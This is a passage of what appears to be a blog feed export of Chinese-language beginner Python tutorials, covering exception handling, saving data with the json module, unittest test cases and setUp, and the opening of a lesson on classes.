class="string">Please enter the second number:0</span></span><br><span class="line"><span class="string">The second number can&#x27;t be zero!</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;Enter q to quit when type in number</span></span><br><span class="line"><span class="string">Please enter the first number:q</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;Good Bye!</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="决定报告哪些错误"><a class="markdownIt-Anchor" href="#决定报告哪些错误"></a> 决定报告哪些错误</h3><p>有时候，我们可以选择在程序运行出现错误时不选择任何信息，即在用户的眼里，程序并没有出现任何异常。这个时候我们需要使用<code>pass</code>语句，它告诉Python什么都不要做。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">count_words</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        --snip--</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        --snip--</span><br></pre></td></tr></table></figure><p>以上代码块在遇到FileNotFoundError时什么都不会发生。</p><p>向用户显示他们不想看到的信息可能会降低程序的可用性，要与用户分享多少信息都由你决定。</p><h2 id="存储数据"><a class="markdownIt-Anchor" href="#存储数据"></a> 存储数据</h2><p>在打开文件、写入文件后，自然就是存储信息了。比如储存用户玩galgame时的选项或者RPG角色信息，每次关闭游戏时你几乎总得保存他们提供的信息。一种简单的方式是用json模块来储存数据。（文明6出列！）</p><p>模块json能让你将简单的Python数据转存到文件中，并在程序运行时加载该文件的数据，你还可以使用json在不同的Python程序间分享数据。更重要的是json数据并非Python专用的，故可以与其他语言的人分享数据，十分有用也易于学习。</p><h3 id="jsondump和jsonload"><a class="markdownIt-Anchor" href="#jsondump和jsonload"></a> json.dump()和json.load()</h3><p>函数jsom.dump()接收两个实参，要储存的数据以及用于储存的文件对象。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">number=[<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">filename=<span class="string">&#x27;number.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    json.dump(number,file)</span><br></pre></td></tr></table></figure><p>程序没有输出，我们打开json文件就会发现内容储存格式和Python一样。</p><p>再用json.load()将这个列表读取到内存中。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">filename=<span class="string">&#x27;number.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> file:</span><br><span class="line">    numbers=json.load(file)</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(numbers)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;[2,3,5,7,9]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>这是一种在程序间共享内存的简单方式。</p><h4 id="保护和读取用户生成的数据"><a class="markdownIt-Anchor" href="#保护和读取用户生成的数据"></a> 保护和读取用户生成的数据</h4><p>对于用户的数据，使用json来保存他们是很有好处的，这样可以防止运行停止时的用户信息丢失。下面就是一个例子，当用户首次运行时被提示输入自己的名字，这样再次运行时程序就已经记住他了。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">filename=<span class="string">&#x27;username.json&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> file:</span><br><span class="line">        username=json.load(file)</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">    username=<span class="built_in">input</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        json.dump(username,file)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;We&#x27;ll remember you when you come back, &quot;</span>+username+<span class="string">&quot; !&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Welcome back, &quot;</span>+username+<span class="string">&#x27; !&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h2><p><em><strong>10-13</strong> 验证用户：最后一个remember_me.py版本假设用户要么已输入其用户名，要么是首次运行该程序。我们应修改这个程序，以应对这样的情形：当前和最后一次 运行该程序的用户并非同一个人。</em></p><p><em>为此，在greet_user() 中打印欢迎用户回来的消息前，先询问他用户名是否是对的。如果不对，就调用get_new_username() 让用户输入正确的用户名。</em></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_stored_username</span>():</span><br><span class="line">    filename=<span class="string">&#x27;username.json&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> file:</span><br><span class="line">            username=json.load(file)</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> username</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet_user</span>():</span><br><span class="line">    username=get_stored_username()</span><br><span class="line">    <span class="keyword">if</span> username:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            flag=<span class="built_in">input</span>(<span class="string">&quot;Is your name &quot;</span>+username+<span class="string">&#x27; ?(yes or no)&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> flag==<span class="string">&#x27;yes&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Welcome back, &quot;</span>+username+<span class="string">&quot; !&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> flag==<span class="string">&#x27;no&#x27;</span>:</span><br><span class="line">                get_new_username()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Please enter only &#x27;yes&#x27; or &#x27;no&#x27; !&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        username=<span class="built_in">input</span>(<span class="string">&quot;What is your name?&quot;</span>)</span><br><span class="line">        filename=<span class="string">&#x27;username.json&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            json.dump(username,file)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;We&#x27;ll remember you when you come back, &quot;</span>+ username+<span class="string">&quot; !&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_new_username</span>():</span><br><span class="line">    username=<span class="built_in">input</span>(<span class="string">&quot;What is your name?&quot;</span>)</span><br><span class="line">    filename=<span class="string">&#x27;username.json&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        json.dump(username,file)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;We&#x27;ll remember you when you come back, &quot;</span>+ username+<span class="string">&quot; !&quot;</span>)</span><br><span class="line"></span><br><span class="line">greet_user()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;Is your name Adam Ben ?(yes or no)</span></span><br><span class="line"><span class="string">666</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;Please enter only &#x27;yes&#x27; or &#x27;no&#x27; !</span></span><br><span class="line"><span class="string">Is your name Adam Ben ?(yes or no)</span></span><br><span class="line"><span class="string">no</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;What is your name?</span></span><br><span class="line"><span class="string">JJG </span></span><br><span class="line"><span class="string">&gt;&gt;We&#x27;ll remember you when you come back, JJG !</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;Is your name JJG ?(yes or no)</span></span><br><span class="line"><span class="string">yes</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;Welcome back, JJG !</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="十-测试代码"><a class="markdownIt-Anchor" href="#十-测试代码"></a> 十、测试代码</h1><h2 id="测试函数"><a class="markdownIt-Anchor" href="#测试函数"></a> 测试函数</h2><p>我们先写一个简单的待测试函数，以供后续举例使用。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_name</span>(<span class="params">fname,lname</span>):</span><br><span class="line">    full_name=<span class="string">f&quot;<span class="subst">&#123;fname&#125;</span> <span class="subst">&#123;lname&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> full_name.title()</span><br></pre></td></tr></table></figure><p>现在我们要修改函数get_name，使其能够处理中间名，但是这样的修改有一定的风险。所以我们要对函数进行测试。</p><h3 id="单元测试和测试用例"><a class="markdownIt-Anchor" href="#单元测试和测试用例"></a> 单元测试和测试用例</h3><p>Python的标准库中的unittest库提供了代码测试工具。<strong>单元测试</strong>用于核实函数的某个方面没有问题；<strong>测试用例</strong>是一组单元测试，这些单元测试都符合要求。<strong>全覆盖式测试</strong>用例包含一整套单元测试。</p><p>要为函数编写测试用例，可先导入unittest模块以及要测试的函数，再创建一个继承unittest.TestCase的类，并编写一系列方法对函数行为的不同方面进行测试。</p><h4 id="一个成功的案例"><a class="markdownIt-Anchor" href="#一个成功的案例"></a> 一个成功的案例</h4><p>下面是一个方法的测试用例，它检查函数get_name能否正常工作。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_name</span>(<span class="params">fname,lname</span>):</span><br><span class="line">    full_name=<span class="string">f&quot;<span class="subst">&#123;fname&#125;</span> <span class="subst">&#123;lname&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> full_name.title()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameTestCase</span>(unittest.TestCase):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_first_last_name</span>(<span class="params">self</span>):</span><br><span class="line">        name=get_name(<span class="string">&#x27;adam&#x27;</span>,<span class="string">&#x27;ben&#x27;</span>)</span><br><span class="line">        self.assertEqual(name,<span class="string">&#x27;Adam Ben&#x27;</span>)</span><br><span class="line"></span><br><span class="line">unittest.main()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;.</span></span><br><span class="line"><span class="string">----------------------------------------------------------------------</span></span><br><span class="line"><span class="string">Ran 1 test in 0.001s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OK</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>首先，我们导入了<code>unittest</code>模块，并创建了一个名为<code>NameTestCase</code>的类，用于包含一系列针对<code>get_name</code>函数的单元测试。类名可以随意，但最好遵循驼峰命名法并且包含Test字样。类必须继承<code>unittest.TestCase</code>类，这样Python才知道怎么运行你编写的测试。</p><p><code>NameTestCase</code>只包含一个方法，用于测试<code>get_name</code>函数的一个方面，我们将这个方法命名为<code>test_first_last_name</code>，因为我们要核实的只是姓名能否被正确的格式化。在运行主程序时，所有以test开头的方法都会被自动运行。在这个方法中，我们调用了测试的函数以及函数返回值。即使用’adam’、'ben’实参调用了<code>get_name</code>函数，并将运行结果储存在<code>name</code>中。</p><p>随后，我们使用了一个unittest类中最重要的功能之一：<strong>断言</strong>方法。断言方法用来核实我们得到的结果和期望是否一致。比如在这个例子里，我们调用unittest.assertEqual方法并向其传递<code>name</code>和’Adam Ben’。意思就是比较这两者是否相同，如果不同就告诉我一声。</p><p>而得到的输出也很耐人寻味。第一行的一个句点表示有一个测试通过了，接下来的一行指出Python运行了一个测试，且消耗时间为0.001秒。最后的OK表示所有单元测试都通过了。</p><p>以上我们就知道<code>get_name</code>函数能够正确处理数据，这样当我们修改<code>get_name</code>函数后，我们可以继续运行这个测试用例，如果测试通过，就表示函数能够正确处理adam ben这样的姓名。</p><h4 id="一个失败的案例"><a class="markdownIt-Anchor" href="#一个失败的案例"></a> 一个失败的案例</h4><p>现在我们修改<code>get_name</code>函数，使其拥有处理中间名的功能，但是无法处理没有中间名的情况。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_name</span>(<span class="params">first,middle,last</span>):</span><br><span class="line">    full_name=first+<span class="string">&#x27; &#x27;</span>+middle+<span class="string">&#x27; &#x27;</span>+last</span><br><span class="line">    <span class="keyword">return</span> full_name.title()</span><br></pre></td></tr></table></figure><p>这时再调用函数向其传递一个不含中间名的参数，肯定是无法正确处理的。而它的报错信息是：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">E</span><br><span class="line">======================================================================</span><br><span class="line">ERROR: test_first_last_name (__main__.NameTestCase.test_first_last_name)</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;D:\Code\Python从入门到实践\11\11.1.2.py&quot;</span>, line <span class="number">13</span>, <span class="keyword">in</span> test_first_last_name</span><br><span class="line">    name=get_name(<span class="string">&#x27;adam&#x27;</span>,<span class="string">&#x27;ben&#x27;</span>)</span><br><span class="line">         ^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">TypeError: get_name() missing <span class="number">1</span> required positional argument: <span class="string">&#x27;last&#x27;</span>  </span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran <span class="number">1</span> test <span class="keyword">in</span> <span class="number">0.005</span>s</span><br><span class="line"></span><br><span class="line">FAILED (errors=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>第一行只有一个字母E，它指出测试用例中有一个单元测试导致了错误。接着我们看到详细的错误信息：是<code>NameTestCase</code>中的<code>test_first_last_name</code>导致了错误，然后给出了一个traceback，指出应该缺少了一个参数。</p><p>最后的信息提示运行了一个单元测试，整个测试未通过，因为运行测试时发生了一个错误。这条信息位于末尾，让你一眼就能知道发生了什么情况。</p><h2 id="测试类"><a class="markdownIt-Anchor" href="#测试类"></a> 测试类</h2><p>前面介绍了测试函数的方法，下面来编写针对类的测试。测试类的方法和测试函数的方法基本类似。通过测试类，就可以知道对类的改动有没有意外的破坏其原有行为。</p><h3 id="各种断言方法"><a class="markdownIt-Anchor" href="#各种断言方法"></a> 各种断言方法</h3><p>在开始介绍针对类的测试方法前，我们先简要的介绍一下断言的各种方法。</p><table><thead><tr><th>方法</th><th>用途</th></tr></thead><tbody><tr><td>assertEqual(a,b)</td><td>核实a==b</td></tr><tr><td>assertNotEqual(a,b)</td><td>核实a!=b</td></tr><tr><td>assertTrue(x)</td><td>核实x为True</td></tr><tr><td>assertFalse(x)</td><td>核实x为False</td></tr><tr><td>assertIn(item,list)</td><td>核实item在list中</td></tr><tr><td>assertNotIn(item,list)</td><td>核实item不在list中</td></tr></tbody></table><h3 id="一个要测试的类"><a class="markdownIt-Anchor" href="#一个要测试的类"></a> 一个要测试的类</h3><p>以下我们定义了一个叫做<code>AnonymousSurvey</code>的类用于模拟一次匿名调查收集：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AnonymousSurvey</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,question</span>):</span><br><span class="line">        self.question=question</span><br><span class="line">        self.responses=[]<span class="comment">#初始化回答为空列表</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_question</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;指定要提问的问题&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(self.question)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">store_response</span>(<span class="params">self,new_response</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;储存回答到列表&#x27;&#x27;&#x27;</span></span><br><span class="line">        self.responses.append(new_response)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_results</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;输出回答&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;survey results:&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> response <span class="keyword">in</span> self.responses:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;- &#x27;</span>+response)</span><br></pre></td></tr></table></figure><p>现在我们编写一个程序来使用这个类。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> survey <span class="keyword">import</span> AnonymousSurvey</span><br><span class="line"></span><br><span class="line">question=<span class="string">&quot;What language did you first learn to speak?&quot;</span></span><br><span class="line">my_survey=AnonymousSurvey(question)</span><br><span class="line"></span><br><span class="line">my_survey.show_question()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter &#x27;q&#x27; to quit at any time.\n&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    response=<span class="built_in">input</span>(<span class="string">&quot;Language: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> response==<span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    my_survey.store_response(response)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nThank you to everyone who participate in our survey!&quot;</span>)</span><br><span class="line">my_survey.show_results()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;What language did you first learn to speak?</span></span><br><span class="line"><span class="string">Enter &#x27;q&#x27; to quit at any time.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Language: Chinese</span></span><br><span class="line"><span class="string">Language: English</span></span><br><span class="line"><span class="string">Language: Japanese</span></span><br><span class="line"><span class="string">Language: q</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Thank you to everyone who participate in our survey!</span></span><br><span class="line"><span class="string">survey results:</span></span><br><span class="line"><span class="string">- Chinese</span></span><br><span class="line"><span class="string">- English</span></span><br><span class="line"><span class="string">- Japanese</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>我们导入了<code>AnonymousSurvey</code>类并将my_survey实例化，向其输入问题和答案，最后将结果打印出来。</p><h4 id="测试anonymoussurvey类"><a class="markdownIt-Anchor" href="#测试anonymoussurvey类"></a> 测试<code>AnonymousSurvey</code>类</h4><p>下面来编写一个测试，对<code>AnonymousSurvey</code>类的一个方法进行验：如果用户面对调查问题时只提供了一个答案，这个答案能够被妥善储存。使用<code>assertIn</code>来核实答案被储存在答案列表中。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> survey <span class="keyword">import</span> AnonymousSurvey</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestAnonymouseSurvey</span>(unittest.TestCase):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_store_single_response</span>(<span class="params">self</span>):</span><br><span class="line">        question=<span class="string">&quot;What language did you first speak?&quot;</span></span><br><span class="line">        my_survey=AnonymousSurvey(question)<span class="comment">#实例化my_survey</span></span><br><span class="line">        my_survey.store_response(<span class="string">&quot;Chinese&quot;</span>)<span class="comment">#传入实参&quot;Chinese&quot;给方法</span></span><br><span class="line"></span><br><span class="line">        self.assertIn(<span class="string">&quot;Chinese&quot;</span>,my_survey.responses)<span class="comment">#检验&quot;Chinese&quot;是否包含在列表中</span></span><br><span class="line"></span><br><span class="line">unittest.main()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;.</span></span><br><span class="line"><span class="string">----------------------------------------------------------------------</span></span><br><span class="line"><span class="string">Ran 1 test in 0.001s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OK</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>只核实一个答案是否被存储的用处不大。下面用户提供三个答案时，数据也应该被妥善存储。为此，我们在<code>TestAnonYmousSurvey</code>中再添加一个方法。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> survey <span class="keyword">import</span> AnonymousSurvey</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestAnonymouseSurvey</span>(unittest.TestCase):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_store_single_response</span>(<span class="params">self</span>):</span><br><span class="line">        question=<span class="string">&quot;What language did you first speak?&quot;</span></span><br><span class="line">        my_survey=AnonymousSurvey(question)</span><br><span class="line">        my_survey.store_response(<span class="string">&quot;Chinese&quot;</span>)</span><br><span class="line"></span><br><span class="line">        self.assertIn(<span class="string">&quot;Chinese&quot;</span>,my_survey.responses)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_store_three_response</span>(<span class="params">self</span>):</span><br><span class="line">        question=<span class="string">&quot;What language did you first speak?&quot;</span></span><br><span class="line">        my_survey=AnonymousSurvey(question)</span><br><span class="line">        responses=[<span class="string">&#x27;English&#x27;</span>,<span class="string">&#x27;Spanish&#x27;</span>,<span class="string">&#x27;Mandarin&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> response <span class="keyword">in</span> responses:</span><br><span class="line">            my_survey.store_response(response)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> response <span class="keyword">in</span> responses:</span><br><span class="line">            self.assertIn(response,my_survey.responses)</span><br><span class="line"></span><br><span class="line">unittest.main()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;..</span></span><br><span class="line"><span class="string">----------------------------------------------------------------------</span></span><br><span class="line"><span class="string">Ran 2 tests in 0.001s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OK</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>两个测试都通过了。</p><h3 id="方法setup"><a class="markdownIt-Anchor" href="#方法setup"></a> 方法setUp()</h3><p>在进行对<code>AnonymousSurvey</code>的第二次测试中，我们在每个方法中都创建了一个<code>AnonymousSurvey</code>实例，并给出了答案。<code>unittest</code>模块中包含一个方法<code>setUp</code>，它可以让你只需要创建这些对象一次，然后直接调用即可。如果你在<code>TestCase</code>中包含了了方法<code>setUp</code>，Python会优先执行它，然后再运行其他test_开头的方法。</p><p>下面使用<code>setUp</code>方法来创建一个调查对象和一组答案。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> survey <span class="keyword">import</span> AnonymousSurvey</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestAnonymouseSurvey</span>(unittest.TestCase):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setUp</span>(<span class="params">self</span>):</span><br><span class="line">        question=<span class="string">&quot;What language did you first speak?&quot;</span></span><br><span class="line">        self.my_survey=AnonymousSurvey(question)</span><br><span class="line">        self.responses=[<span class="string">&#x27;English&#x27;</span>,<span class="string">&#x27;Spanish&#x27;</span>,<span class="string">&#x27;Mandarin&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_store_single_response</span>(<span class="params">self</span>):</span><br><span class="line">        self.my_survey.store_response(self.responses[<span class="number">0</span>])</span><br><span class="line">        self.assertIn(self.responses[<span class="number">0</span>],self.my_survey.responses)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_store_three_response</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> response <span class="keyword">in</span> self.responses:</span><br><span class="line">            self.my_survey.store_response(response)</span><br><span class="line">        <span class="keyword">for</span> response <span class="keyword">in</span> self.responses:</span><br><span class="line">            self.assertIn(response,self.my_survey.responses)</span><br><span class="line"></span><br><span class="line">unittest.main()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;..</span></span><br><span class="line"><span class="string">----------------------------------------------------------------------</span></span><br><span class="line"><span class="string">Ran 2 tests in 0.001s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OK</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>setUp</code>方法做了两件事情，一是创建一个调查对象，二是创建一个答案列表，储存这两样东西的变量名前缀都包含self（存储在属性中），因此这两个变量可以在类的任意地方使用。这样让测试方法更加简单，而免去了重新创建对象和答案的麻烦。</p><p>在编写测试自己的类时，使用<code>setUp</code>方法让测试变得容易，可以在方法中创建一系列实例并设置其属性。再在测试方法中去调用这些实例。</p><p>至此，Python基础部分，堂堂完结！！！</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/%E5%A4%8D%E4%BB%B6%2068656793_p0.png" alt="复件 68656793_p0" /></p>]]></content>
      
      
      <categories>
          
          <category> Python学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始学Python（四）</title>
      <link href="/posts/62dec7e59779/"/>
      <url>/posts/62dec7e59779/</url>
      
        <content type="html"><![CDATA[<p>C语言中不包含类这个概念，但是C<ins>中有。不过遗憾的是我并没有系统的学完过C</ins>，所以是第一次接触类这个概念。下面我来仔细分析一下什么是“类”。</p><p>（前排提醒本章内容较多，请备好凳子）</p><p>以下情景改编自<a href="https://zhuanlan.zhihu.com/p/102331478">https://zhuanlan.zhihu.com/p/102331478</a></p><hr /><h1 id="九-类"><a class="markdownIt-Anchor" href="#九-类"></a> 九、类</h1><h2 id="情境导入"><a class="markdownIt-Anchor" href="#情境导入"></a> 情境导入</h2><p>假如你知道一个三角形的三条边长，需要计算一个三角形的周长，面积，正弦值等。你可能会在Python中写几个不同的函数，分别计算所需要的三角形的数据。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> ...:    <span class="comment"># 参照公式把五个函数定义出来，就不详细写了</span></span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">def</span> ...:</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后调用定义好的函数，传入边长数据</span></span><br><span class="line">angleA(<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>)  <span class="comment"># 计算角A</span></span><br><span class="line">-&gt;<span class="number">0.8127555613686607</span>  <span class="comment"># 注意返回值为弧度</span></span><br><span class="line"></span><br><span class="line">angleB(<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>)  <span class="comment"># 计算角B</span></span><br><span class="line">-&gt;<span class="number">1.0107210205683146</span></span><br><span class="line"></span><br><span class="line">angleC(<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>)  <span class="comment"># 计算角C</span></span><br><span class="line">-&gt;<span class="number">1.318116071652818</span></span><br><span class="line"></span><br><span class="line">square(<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>)  <span class="comment"># 计算面积</span></span><br><span class="line">-&gt;<span class="number">20.33316256758894</span></span><br><span class="line"></span><br><span class="line">circle(<span class="number">6</span>,<span class="number">7</span>,<span class="number">7</span>)  <span class="comment"># 计算周长，额，好像有个数字写错了</span></span><br><span class="line">-&gt;<span class="number">20</span>  <span class="comment"># 计算结果当然也就错了</span></span><br></pre></td></tr></table></figure><p>但是这样很麻烦，因为要获取这些数据，你需要传五次参数，万一某次参数传输错误就容易出现错误，往往这个错误还不容易被发现。</p><p>那么，有没有一个方法，我们只需要传递一次参数呢？</p><p>你也许会想，简单，我直接把所有的函数集成到一个函数里不就好了。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">calculate</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    angleA = ...</span><br><span class="line">    angleB = ...</span><br><span class="line">    angleC = ...</span><br><span class="line">    square = ...</span><br><span class="line">    circle = ...</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;角A&#x27;</span>:angleA, <span class="string">&#x27;角B&#x27;</span>:angleB, <span 